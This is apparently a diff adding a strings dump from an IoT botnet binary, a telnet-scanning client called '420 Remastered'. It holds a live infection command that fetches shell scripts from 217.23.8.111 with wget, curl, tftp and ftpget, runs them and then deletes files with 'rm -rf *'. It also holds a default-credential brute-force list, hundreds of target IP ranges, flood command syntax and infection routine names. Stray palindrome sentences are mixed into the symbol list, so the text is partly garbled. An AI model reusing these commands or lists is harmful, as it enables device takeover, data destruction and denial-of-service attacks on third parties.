@@ -1,0 +1,1373 @@
+&  @
+217.23.8.111:690
+cd /tmp; wget http://217.23.8.111/unk.sh; chmod 777 unk.sh; sh unk.sh; tftp 217.23.8.111 -c get tunk.sh; chmod 777 tunk.sh; sh tunk.sh; tftp -r tunk2.sh -g 217.23.8.111; chmod 777 tunk2.sh; sh tunk2.sh; ftpget -v -u anonymous -p anonymous -P 21 217.23.8.111 tunk1.sh tunk1.sh; sh tunk1.sh; rm -rf unk.sh tunk.sh tunk2.sh tunk1.sh; rm -rf *
+sh;shell;enable
+cd /tmp; wget http://217.23.8.111/unk.sh; curl -O http://217.23.8.111/unk.sh; chmod 777 unk.sh; sh unk.sh; tftp 217.23.8.111 -c get tunk.sh; chmod 777 tunk.sh; sh tunk.sh; tftp -r tunk2.sh -g 217.23.8.111; chmod 777 tunk2.sh; sh tunk2.sh; ftpget -v -u anonymous -p anonymous -P 21 217.23.8.111 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf unk.sh tunk.sh tunk2.sh ftp1.sh; rm -rf *
+666666
+support
+default
+root
+admin
+supervisor
+1234
+123456
+vnpt
+1234567890
+antslq
+zyad1234
+anko
+tini
+letacla
+/dev/netslink/
+/tmp/
+/var/
+/dev/
+/var/run/
+/dev/shm/
+/mnt/
+/boot/
+/usr/
+BusyBox
+ogin
+sername
+assword
+nvalid
+ailed
+ncorrect
+enied
+rror
+oodbye
+420BLAZEITFGT
+(null)
+/bin/sh
+/proc/cpuinfo
+BOGOMIPS
+PING
+%d.%d.%d.%d
+112.5.%d.%d
+210.213.%d.%d
+122.2.%d.%d
+122.3.%d.%d
+95.9.%d.%d
+41.252.%d.%d
+119.94.%d.%d
+104.55.%d.%d
+78.186.%d.%d
+119.93.%d.%d
+119.92.%d.%d
+124.83.%d.%d
+41.254.%d.%d
+103.20.%d.%d
+103.47.%d.%d
+122.54.%d.%d
+122.53.%d.%d
+122.52.%d.%d
+137.59.%d.%d
+14.204.%d.%d
+27.54.%d.%d
+43.253.%d.%d
+43.230.%d.%d
+124.107.%d.%d
+124.106.%d.%d
+43.245.%d.%d
+124.105.%d.%d
+123.25.%d.%d
+103.54.%d.%d
+27.255.%d.%d
+103.204.%d.%d
+123.24.%d.%d
+113.191.%d.%d
+113.188.%d.%d
+113.189.%d.%d
+124.104.%d.%d
+14.160.%d.%d
+14.161.%d.%d
+14.162.%d.%d
+14.163.%d.%d
+14.164.%d.%d
+14.165.%d.%d
+14.166.%d.%d
+14.167.%d.%d
+14.168.%d.%d
+14.169.%d.%d
+14.170.%d.%d
+14.171.%d.%d
+14.172.%d.%d
+14.173.%d.%d
+14.174.%d.%d
+14.175.%d.%d
+14.176.%d.%d
+14.177.%d.%d
+14.178.%d.%d
+14.179.%d.%d
+14.180.%d.%d
+14.181.%d.%d
+14.182.%d.%d
+14.183.%d.%d
+14.184.%d.%d
+14.185.%d.%d
+14.186.%d.%d
+14.187.%d.%d
+14.188.%d.%d
+14.189.%d.%d
+14.190.%d.%d
+14.191.%d.%d
+45.121.%d.%d
+45.120.%d.%d
+45.115.%d.%d
+43.252.%d.%d
+43.240.%d.%d
+41.174.%d.%d
+49.118.%d.%d
+49.144.%d.%d
+alula
+49.145.%d.%d
+103.30.%d.%d
+14.33.%d.%d
+123.16.%d.%d
+202.44.%d.%d
+116.93.%d.%d
+49.146.%d.%d
+41.253.%d.%d
+117.173.%d.%d
+113.190.%d.%d
+146.88.%d.%d
+112.196.%d.%d
+113.178.%d.%d
+112.45.%d.%d
+183.223.%d.%d
+116.71.%d.%d
+103.44.%d.%d
+110.235.%d.%d
+124.253.%d.%d
+211.237.%d.%d
+117.175.%d.%d
+178.93.%d.%d
+111.9.%d.%d
+222.252.%d.%d
+113.174.%d.%d
+113.160.%d.%d
+113.161.%d.%d
+113.162.%d.%d
+113.163.%d.%d
+113.164.%d.%d
+113.165.%d.%d
+113.166.%d.%d
+113.167.%d.%d
+113.168.%d.%d
+113.169.%d.%d
+123.17.%d.%d
+123.18.%d.%d
+123.19.%d.%d
+123.20.%d.%d
+123.21.%d.%d
+123.22.%d.%d
+222.253.%d.%d
+222.254.%d.%d
+222.255.%d.%d
+37.247.%d.%d
+41.208.%d.%d
+183.220.%d.%d
+49.147.%d.%d
+103.198.%d.%d
+49.148.%d.%d
+88.248.%d.%d
+88.105.%d.%d
+Tacocat
+88.247.%d.%d
+85.105.%d.%d
+188.3.%d.%d
+103.203.%d.%d
+103.55.%d.%d
+103.220.%d.%d
+183.233.%d.%d
+103.242.%d.%d
+103.14.%d.%d
+103.195.%d.%d
+103.214.%d.%d
+103.218.%d.%d
+103.225.%d.%d
+103.228.%d.%d
+103.231.%d.%d
+103.60.%d.%d
+103.248.%d.%d
+103.253.%d.%d
+103.255.%d.%d
+103.35.%d.%d
+103.49.%d.%d
+103.62.%d.%d
+144.48.%d.%d
+49.149.%d.%d
+58.69.%d.%d
+223.29.%d.%d
+59.153.%d.%d
+113.176.%d.%d
+113.175.%d.%d
+113.177.%d.%d
+113.183.%d.%d
+202.164.%d.%d
+203.134.%d.%d
+210.56.%d.%d
+49.156.%d.%d
+203.210.%d.%d
+117.181.%d.%d
+117.178.%d.%d
+117.177.%d.%d
+117.176.%d.%d
+117.170.%d.%d
+117.171.%d.%d
+117.162.%d.%d
+112.26.%d.%d
+112.27.%d.%d
+112.28.%d.%d
+112.29.%d.%d
+112.30.%d.%d
+112.31.%d.%d
+203.150.%d.%d
+50.233.%d.%d
+103.82.%d.%d
+27.124.%d.%d
+shell
+enable
+SUCCESS| %s:%s:%s
+Remastered %s:%s:%s
+ERROR| %s:%s:%s
+Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
+Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
+Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
+close
+keep-alive
+accept
+%s %s HTTP/1.1
+Connection: %s
+Accept: */*
+User-Agent: %s
+Failed opening raw socket.
+Failed setting raw headers mode.
+QTELNET
+QTELNET <threads> <timeout>
+QTELNET STARTING
+HOODASSSHIT
+HTKVJJJJGHGNOTITP
+RANGE
+RANGE <option 0-idk>
+Range %d->%d
+STD <target> <port> <time>
+KILLATTK
+unkSec
+8.8.8.8
+/proc/net/route
+	00000000	
+Please take a moment to notice how dank this client is. 
+ - 420 Remastered
+ - By xunk.
+/etc/rc.d/rc.local
+/etc/rc.conf
+"%s%s"
+fork failed
+[1;31m[<3] 
+[0;37munk BOT 
+[1;32m| 
+[0;35m%s 
+[1;32m| 
+[0;37m%s
+SHEWRLIGHEWRIHGOIEWR
+%s 2>&1
+(nil)
+(null)
+hlLjztqZ
+npxXoudifFeEgGaACScs
+ +0-#'I
+ !"N?OZB>
+KM^_`abcdefghijk
+mHoIJPqGRSTUVWXL\s]Yrp|{nzt[D&'()*+,-./0123456789:;<=@A%$FuvwxyE}~l
+Unknown error 
+Success
+Operation not permitted
+No such file or directory
+No such process
+Interrupted system call
+Input/output error
+No such device or address
+Argument list too long
+Exec format error
+Bad file descriptor
+No child processes
+Resource temporarily unavailable
+Cannot allocate memory
+Permission denied
+Bad address
+Block device required
+Device or resource busy
+File exists
+Invalid cross-device link
+No such device
+Not a directory
+Is a directory
+Invalid argument
+Too many open files in system
+Too many open files
+Inappropriate ioctl for device
+Text file busy
+File too large
+No space left on device
+Illegal seek
+Read-only file system
+Too many links
+Broken pipe
+Numerical argument out of domain
+Numerical result out of range
+Resource deadlock avoided
+File name too long
+No locks available
+Function not implemented
+Directory not empty
+Too many levels of symbolic links
+No message of desired type
+Identifier removed
+Channel number out of range
+Level 2 not synchronized
+Level 3 halted
+Level 3 reset
+Link number out of range
+Protocol driver not attached
+No CSI structure available
+Level 2 halted
+Invalid exchange
+Invalid request descriptor
+Exchange full
+No anode
+Invalid request code
+Invalid slot
+Bad font file format
+Device not a stream
+No data available
+Timer expired
+Out of streams resources
+Machine is not on the network
+Package not installed
+Object is remote
+Link has been severed
+Advertise error
+Srmount error
+Communication error on send
+Protocol error
+Multihop attempted
+RFS specific error
+Bad message
+Value too large for defined data type
+Name not unique on network
+File descriptor in bad state
+Remote address changed
+Can not access a needed shared library
+Accessing a corrupted shared library
+.lib section in a.out corrupted
+Attempting to link in too many shared libraries
+Cannot exec a shared library directly
+Invalid or incomplete multibyte or wide character
+Interrupted system call should be restarted
+Streams pipe error
+Too many users
+Socket operation on non-socket
+Destination address required
+Message too long
+Protocol wrong type for socket
+Protocol not available
+Protocol not supported
+Socket type not supported
+Operation not supported
+Protocol family not supported
+Address family not supported by protocol
+Address already in use
+Cannot assign requested address
+Network is down
+Network is unreachable
+Network dropped connection on reset
+Software caused connection abort
+Connection reset by peer
+No buffer space available
+Transport endpoint is already connected
+Transport endpoint is not connected
+Cannot send after transport endpoint shutdown
+Too many references: cannot splice
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+Stale NFS file handle
+Structure needs cleaning
+Not a XENIX named type file
+No XENIX semaphores available
+Is a named type file
+Remote I/O error
+Disk quota exceeded
+No medium found
+Wrong medium type
+File locking deadlock error
+?/bin/sh
+/dev/null
+/etc/resolv.conf
+/etc/config/resolv.conf
+nameserver
+domain
+search
+0123456789abcdef
+/etc/hosts
+/etc/config/hosts
+S[kA
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+Degas are we not drawn onward no In union drawn onward to new eras aged
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+__muldi3
+/home/firmware/build/temp-sparc/gcc-core/gcc
+libgcc2.c
+libgcc2.h
+__muldi3
+DWunion
+complex float
+long long unsigned int
+/home/firmware/build/temp-sparc/gcc-core/gcc/libgcc2.c
+SItype
+long long int
+DWstruct
+DItype
+/home/firmware/build/temp-sparc/build-gcc/gcc
+complex double
+short int
+high
+GNU C 4.1.2
+unsigned char
+short unsigned int
+.symtab
+.strtab
+.shstrtab
+.init
+.text
+.fini
+.rodata
+.eh_frame
+.ctors
+.dtors
+.jcr
+.data
+Beeb
+.bss
+.comment
+.debug_aranges
+.debug_pubnames
+.debug_info
+.debug_abbrev
+.debug_line
+.debug_frame
+.debug_str
+.debug_loc
+.debug_ranges
+initfini.c
+libc/sysdeps/linux/sparc/crti.S
+crtstuff.c
+__CTOR_LIST__
+__DTOR_LIST__
+__EH_FRAME_BEGIN__
+__JCR_LIST__
+completed.2248
+p.2246
+__do_global_dtors_aux
+call___do_global_dtors_aux
+object.2329
+frame_dummy
+call_frame_dummy
+__CTOR_END__
+__DTOR_END__
+__FRAME_END__
+__JCR_END__
+__do_global_ctors_aux
+call___do_global_ctors_aux
+libc/sysdeps/linux/sparc/crtn.S
+libc/sysdeps/linux/sparc/crt1.S
+Love#1.c
+i.4173
+printchar
+prints
+printi
+print
+fdopen_pids
+ipState
+get_random_ip
+libgcc2.c
+libc/sysdeps/linux/sparc/fork.S
+libc/sysdeps/linux/sparc/vfork.S
+libc/sysdeps/linux/sparc/urem.S
+libc/sysdeps/linux/sparc/udiv.S
+libc/sysdeps/linux/sparc/umul.S
+libc/sysdeps/linux/sparc/rem.S
+__syscall_fcntl.c
+__syscall_fcntl64.c
+_exit.c
+chdir.c
+close.c
+dup2.c
+getcwd.c
+getdtablesize.c
+getpagesize.c
+getpid.c
+getrlimit.c
+ioctl.c
+kill.c
+open.c
+pipe.c
+prctl.c
+read.c
+select.c
+setsid.c
+sigprocmask.c
+time.c
+waitpid.c
+write.c
+isspace.c
+toupper.c
+__C_ctype_b.c
+__C_ctype_toupper.c
+__errno_location.c
+fclose.c
+fopen.c
+sprintf.c
+vsnprintf.c
+_fopen.c
+_stdio.c
+_stdio_streams
+__stdio_mutex_initializer.3860
+_fixed_buffers
+_wcommit.c
+_vfprintf_internal.c
+_charpad
+_fp_out_narrow
+spec_base.4071
+prefix.4072
+_ppfs_init.c
+_ppfs_prepargs.c
+_ppfs_setargs.c
+_ppfs_parsespec.c
+_promoted_size
+type_codes
+type_sizes
+spec_flags.4073
+qual_chars.4078
+spec_chars.4074
+spec_ranges.4075
+spec_and_mask.4077
+spec_or_mask.4076
+feof.c
+fgets.c
+fputs.c
+fflush_unlocked.c
+fgets_unlocked.c
+fputs_unlocked.c
+fwrite_unlocked.c
+libc/string/sparc/memcpy.S
+libc/string/sparc/memset.S
+libc/string/sparc/strchr.S
+libc/string/sparc/strcmp.S
+libc/string/sparc/strcpy.S
+libc/string/sparc/strlen.S
+strncpy.c
+strnlen.c
+strstr.c
+__glibc_strerror_r.c
+__xpg_strerror_r.c
+estridx
+unknown.1115
+_string_syserrmsgs.c
+strcasecmp.c
+strcasestr.c
+strtok.c
+next_start.1092
+isatty.c
+tcgetattr.c
+ntohl.c
+inet_ntoa.c
+buf.2628
+inet_makeaddr.c
+gethostbyname.c
+h.4860
+buf.4861
+gethostbyname_r.c
+connect.c
+Do nine men interpret Nine men I nod
+getsockname.c
+getsockopt.c
+recv.c
+send.c
+sendto.c
+setsockopt.c
+socket.c
+sigaddset.c
+sigempty.c
+signal.c
+sigsetops.c
+malloc.c
+initial_fa
+free.c
+realloc.c
+heap_alloc.c
+heap_alloc_at.c
+heap_free.c
+__heap_link_free_area
+__heap_link_free_area_after
+rand.c
+random.c
+mylock
+unsafe_state
+randtbl
+random_r.c
+random_poly_info
+system.c
+atol.c
+strtol.c
+_stdlib_strto_l.c
+exit.c
+execl.c
+sleep.c
+__uClibc_main.c
+__pthread_return_0
+__pthread_return_void
+__check_one_fd
+been_there_done_that.2818
+__socketcall.c
+execve.c
+getegid.c
+geteuid.c
+getgid.c
+getuid.c
+nanosleep.c
+sbrk.c
+wait4.c
+Eleele
+__C_ctype_tolower.c
+errno.c
+__h_errno_location.c
+wcrtomb.c
+wcsrtombs.c
+wcsnrtombs.c
+_WRITE.c
+_fwrite.c
+_trans2w.c
+_load_inttype.c
+_store_inttype.c
+_uintmaxtostr.c
+_fpmaxtostr.c
+exp10_table
+fgetc_unlocked.c
+libc/string/sparc/memchr.S
+mempcpy.c
+memrchr.c
+strtok_r.c
+strpbrk.c
+inet_aton.c
+dnslookup.c
+static_ns
+static_id
+opennameservers.c
+get_hosts_byname_r.c
+sigaction.c
+abort.c
+been_there_done_that
+dl-support.c
+brk.c
+__syscall_rt_sigaction.c
+poll.c
+fseeko.c
+fseeko64.c
+_READ.c
+A Santa lives evil at NASA
+_adjust_pos.c
+_rfill.c
+_trans2r.c
+_cs_funcs.c
+rawmemchr.c
+strncat.c
+strspn.c
+strdup.c
+ntop.c
+inet_pton4
+xdigits.3071
+inet_ntop4
+encodeh.c
+decodeh.c
+encodeq.c
+lengthq.c
+decodea.c
+read_etc_hosts_r.c
+raise.c
+llseek.c
+tolower.c
+encoded.c
+decoded.c
+lengthd.c
+__fini_array_end
+__fini_array_start
+__init_array_end
+__preinit_array_end
+__init_array_start
+__preinit_array_start
+__read_etc_hosts_r
+__GI_execve
+__libc_sigaction
+strcpy
+__GI_fcntl64
+recvLine
+rangesA
+__GI_sigaddset
+__socketcall
+__GI___ctype_b
+__GI_memchr
+__GI___glibc_strerror_r
+waitpid
+__open_nameservers
+__GI_fopen
+getrlimit
+ioctl
+_stdio_openlist_use_count
+__GI_initstate_r
+__GI_sigaction
+strtok_r
+__GI___C_ctype_toupper_data
+__GI_time
+getgid
+stdout
+random
+__GI_strdup
+__GI_getpagesize
+getdtablesize
+__GI_h_errno
+contains_fail
+__length_question
+__GI___ctype_toupper
+__GI_strcasecmp
+__GI_tolower
+recv
+connect
+__encode_question
+__GI___uClibc_fini
+numpids
+__encode_header
+__GI_strncat
+sigemptyset
+getRandomPublicIPB
+__pthread_mutex_lock
+initConnection
+__sigdelset
+__uClibc_fini
+memrchr
+geteuid
+inet_pton
+__GI_vsnprintf
+__GI_setsid
+memmove
+__bsd_signal
+__GI_strpbrk
+__stdio_trans2r_o
+__GI_setsockopt
+__libc_stack_end
+__GI_fclose
+__GI_wcsnrtombs
+__GI_pipe
+rangesB2
+_uintmaxtostr
+__libc_fcntl
+atol
+_h_errno
+getRandomPublicIP
+getc_unlocked
+__ctype_b
+__GI_random_r
+usernames
+errno
+getegid
+read_until_response
+__GI_sbrk
+zprintf
+__GI___uClibc_init
+__heap_alloc_at
+execve
+infectedmessage
+getpagesize
+getpid
+__GI_lseek64
+setstate_r
+fgets
+getHost
+__libc_getpid
+wildString
+__xpg_strerror_r
+__heap_free
+fcntl64
+prctl
+God A red nugget A fat egg under a dog
+memcpy
+makeRandomStr
+getRandomIP
+__GI_fputs_unlocked
+execl
+__GI_fgets
+sendHTTP
+creat
+_stdio_openlist_dec_use
+sclose
+__libc_select
+_ppfs_init
+__GI___C_ctype_toupper
+__GI_fgetc_unlocked
+__libc_nanosleep
+trim
+__GI_fgets_unlocked
+dup2
+__pthread_mutex_init
+tolower
+getuid
+system
+__open_etc_hosts
+feof
+.udiv
+malloc
+isatty
+sleep
+__GI_atol
+vsnprintf
+__dns_lookup
+__GI_read
+__C_ctype_tolower
+random_r
+__dso_handle
+__malloc_heap_lock
+gethostbyname_r
+tcpcsum
+reset_telstate
+fdpclose
+socket
+__GI_dup2
+select
+_pthread_cleanup_pop_restore
+__GI_wcrtomb
+__GI___libc_fcntl
+__GI_memset
+isspace
+__stdio_seek
+mempcpy
+__GI_strcoll
+__GI_write
+__ctype_toupper
+__libc_read
+_string_syserrmsgs
+__GI_open
+__GI_strchr
+__searchdomain
+__malloc_heap
+sigaddset
+__GI_tcgetattr
+__environ
+wcsnrtombs
+bzero
+makeIPPacket
+sockprintf
+__GI_inet_ntoa
+send
+__fgetc_unlocked
+abort
+oldranges
+__GI_fcntl
+__GI_wcsrtombs
+__GI_fwrite_unlocked
+__GI_getgid
+srandom_r
+__GI_fputs
+_init
+__GI_inet_ntoa_r
+__GI_setstate_r
+strtol
+pipe
+__libc_lseek64
+strnlen
+rawmemchr
+__GI_mempcpy
+__GI___C_ctype_b_data
+infectlol
+__sigaddset
+strrchr
+nanosleep
+__GI_send
+h_errno
+__pthread_mutex_unlock
+wait4
+__GI_exit
+__app_fini
+csum
+__exit_cleanup
+rindex
+__GI_execl
+__GI_srandom_r
+__GI___ctype_tolower
+write
+environ
+__GI_close
+getBuild
+__resolv_lock
+kill
+fputs_unlocked
+__pthread_mutex_trylock
+__GI_brk
+__GI_nanosleep
+__GI_strtok
+_stdio_openlist
+__GI_sigprocmask
+inet_addr
+ntohl
+__GI_fseek
+__deregister_frame_info
+ourIP
+chdir
+fseeko
+_stdio_openlist_del_count
+connectTimeout
+__raise
+setsockopt
+bsd_signal
+fseek
+__GI_kill
+__GI_strcmp
+__GI_memmove
+sendSTD
+setstate
+__decode_dotted
+__stdio_READ
+memchr
+__GI_toupper
+__pthread_initialize_minimal
+__GI_recv
+tmpdirs
+__stdin
+stdin
+__GI_isatty
+strcasestr
+_start
+strstr
+__GI_ioctl
+init_rand
+rand
+getRandomPublicIP2
+signal
+read
+__decode_header
+getCores
+__GI___h_errno_location
+__GI_memcpy
+strcoll
+rangesC1
+oldranges2
+wcsrtombs
+_stdio_user_locking
+strncpy
+strcasecmp
+htonl
+sendto
+__C_ctype_toupper
+StartTheLelz
+__GI___C_ctype_b
+HackerScan2
+realloc
+__GI_gethostbyname_r
+__GI_strncpy
+__libc_send
+__GI___xpg_strerror_r
+currentServer
+__GI___C_ctype_tolower
+__GI_getrlimit
+bcopy
+__GI_strcpy
+__GI_inet_ntop
+strtok
+__stdio_adjust_position
+__GI_poll
+_vfprintf_internal
+__GI_strcasestr
+fork
+__stdio_rfill
+strncat
+gotIP
+__GI_sleep
+sigaction
+__GI_gethostbyname
+_dl_phdr
+__GI_getc_unlocked
+__GI___libc_fcntl64
+__uClibc_init
+versionnnn
+_store_inttype
+__length_dotted
+__getpagesize
+__GI_random
+__uclibc_progname
+__GI_getegid
+__GI_wait4
+__uClibc_main
+sbrk
+__rtld_fini
+__GI_fork
+strdup
+__libc_close
+__GI_getpid
+inet_aton
+index
+_pthread_cleanup_push_defer
+processCmd
+__sigismember
+fopen
+__bss_start
+__libc_open
+getOurIP
+get_telstate_host
+memset
+__GI_socket
+main
+__glibc_strerror_r
+ourPublicIP
+listFork
+__GI___C_ctype_tolower_data
+__stdio_fwrite
+negotiate
+srand
+initstate
+fclose
+__syscall_rt_sigaction
+rangesC3
+ntohs
+sendUDP
+inet_ntoa
+tcgetattr
+__C_ctype_tolower_data
+time
+__libc_system
+__GI_abort
+poll
+fdpopen
+__get_hosts_byname_r
+__stdio_init_mutex
+rangesB1
+__GI__exit
+strcmp
+infected
+__GI_strrchr
+advances2
+__nameserver
+data_start
+infect
+__h_errno_location
+getcwd
+__C_ctype_b_data
+__GI_inet_pton
+gethostbyname
+_stdio_fopen
+advance_state
+_fini
+__GI_chdir
+__vfork
+__malloc_sbrk_lock
+contains_success
+sprintf
+fdgets
+strerror_r
+__GI_select
+__libc_waitpid
+socket_connect
+.urem
+__GI_waitpid
+_stdio_term
+.rem
+__decode_answer
+__GI_signal
+stderr
+fails
+commServer
+getRandomPublicIPC
+vfork
+__C_ctype_b
+srandom
+_ppfs_setargs
+__GI_sendto
+__GI_sigemptyset
+__libc_fork
+__atexit_lock
+__ubp_memchr
+scanPid
+rand_cmwc
+findARandomIP
+advances
+__libc_fcntl64
+getsockopt
+__GI_fseeko64
+fflush_unlocked
+__stdio_wcommit
+contains_string
+__GI___fgetc_unlocked
+__nameservers
+fwrite_unlocked
+subversionnnn
+inet_ntoa_r
+__pagesize
+_stdio_openlist_add_lock
+__GI_getdtablesize
+contains_response
+_edata
+__stdout
+__GI_memrchr
+__GI_fflush_unlocked
+__GI_strstr
+__searchdomains
+_end
+htons
+_sigintr
+_ppfs_prepargs
+__GI_strspn
+fgetc_unlocked
+initstate_r
+__GI_connect
+__curbrk
+contains_infectmessage
+__libc_poll
+_dl_phnum
+_fpmaxtostr
+__errno_location
+uppercase
+_stdlib_strto_l
+__GI___libc_open
+exit
+rangesC2
+__stdio_WRITE
+_stdio_init
+__GI_geteuid
+__heap_alloc
+inet_ntop
+__C_ctype_toupper_data
+__GI_getcwd
+_dl_aux_init
+_errno
+atoi
+successes
+_stdio_openlist_del_lock
+__GI_inet_aton
+fgets_unlocked
+_exit
+szprintf
+strspn
+__muldi3
+__libc_recv
+LoopPayload
+__libc_creat
+strlen
+lseek64
+open
+toupper
+__libc_write
+_ppfs_parsespec
+__GI_strtol
+.umul
+__GI_getuid
+__GI_strtok_r
+__GI_errno
+__libc_sendto
+Borrow or rob
+__stdio_trans2w_o
+__GI_vfork
+strchr
+__GI_rawmemchr
+fputs
+__GI_raise
+__data_start
+setsid
+__GI_inet_addr
+getRandomPublicIPA
+__encode_dotted
+__GI_strnlen
+_Jv_RegisterClasses
+macAddress
+__GI___errno_location
+fcntl
+read_with_timeout
+__GI_atoi
+fseeko64
+__GI_sprintf
+__ctype_tolower
+__register_frame_info
+wcrtomb
+__GI_getsockname
+close
+__libc_connect
+passwords
+__GI_strlen
+mainCommSock
+pids
+strpbrk
+getBogos
+_load_inttype
+rangechoice
+raise
+free
+sigprocmask
+getsockname
